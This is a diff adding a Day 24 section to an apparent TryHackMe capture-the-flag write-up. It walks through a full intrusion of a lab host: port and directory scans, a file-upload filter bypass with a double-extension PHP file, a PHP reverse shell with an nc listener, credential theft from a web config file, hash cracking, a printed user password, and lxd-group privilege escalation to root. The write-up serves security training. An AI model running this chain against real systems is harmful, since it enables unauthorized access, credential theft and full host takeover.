@@ -313,33 +313,131 @@ Answer:
 
 ## Day 24: The Trial Before Christmas
 
+scan the target
 
+```
+nmap -sS -A -T4 10.10.50.209
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/0393d988-cfb2-4555-9453-7eb4f00dd2ab)
 
+gobuster the webpage
 
+```
+gobuster dir -u http://10.10.50.209:65000/ -x .php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d49c9f1e-6230-45c0-9d8a-00d288322280)
 
+scan the folder
 
+```
+gobuster dir -u http://10.10.50.209:65000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/62482e01-6577-4677-95de-382d9d2aea47)
 
+bypass the client-side filter using curl because there is no JS support in curl
 
+bypass server-side filter with a double extension to upload some php code
 
+```
+curl -X POST http://10.10.50.209:65000/api/upload/ -H "Content-Type: application/json" --data '{"name":"test.png.php","file":"<?php phpinfo(); ?>"}'
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c9d6bb2e-84d3-40fc-b14d-1ef46bccc8bc)
 
+use burp suite to intercept file and upload a php reverse shell
 
+Ctrl+F5 and drop filter.js
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/da7df0d4-23d6-46e1-888f-a493bffc7d2d)
 
+upload reverse.png.php (`cp /usr/share/webshells/php/php-reverse-shell.php .` and rename it)
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ca86fd83-0b87-4471-b0de-6b832700cb17)
 
+set up listener
 
+```
+nc -vlnp 1234
+```
 
+then go to `http://10.10.50.209:65000/grid/reverse.png.php`
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/932ecdae-6578-49e3-a90f-41412934a273)
 
+find web.txt
 
+```
+find / -name web.txt -type f 2>/dev/null
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a7ab3f26-dbe9-4e92-a6d7-bc26305a499e)
 
+upgrade and stabilize shell
 
+```
+export TERM=xterm
+Ctrl+Z
+stty raw -echo; fg
+```
 
+Review the configuration files for the webserver to find credentials
 
+```
+cat /var/www/TheGrid/includes/dbauth.php
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/eaa51125-b40c-4c55-bbf0-60c9e6a35e36)
 
+connect to the database
+
+```
+mysql -u tron -p
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/88640e0f-721f-490b-9bf8-d6cd2e5601bd)
+
+see users table in tron
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/16244317-6773-41f3-9e95-441128b25928)
+
+use CrackStation to crack the password
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ede0b026-faaf-43fb-afa0-4522d14bd2d6)
+
+```
+su flynn
+@computer@
+cd ~
+cat user.txt
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a873a1eb-2dd2-451a-b9aa-5f043865d603)
+
+you can see it's in group of lxd which can related to privilege escalate
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ce9d8f34-91d9-48b0-b44a-71c215412d8a)
+
+```
+lxc image list
+lxc init Alpine mycontainer -c security.privileged=true
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+lxc start mycontainer
+lxc exec mycontainer /bin/sh
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/2b3afd70-8f77-49ec-8900-842c5449547d)
+
+here you go!
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5a499dcb-3679-4b47-a796-a69ace7adc78)
+
+Answer:
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/6bd0bf2a-1ca9-4079-94a1-f1efe98d7ab4)
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/aa535db0-890d-4b48-b485-24fd1ed2f2e1)
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8c38b880-7cde-4a39-8e70-8fa00d5f300a)
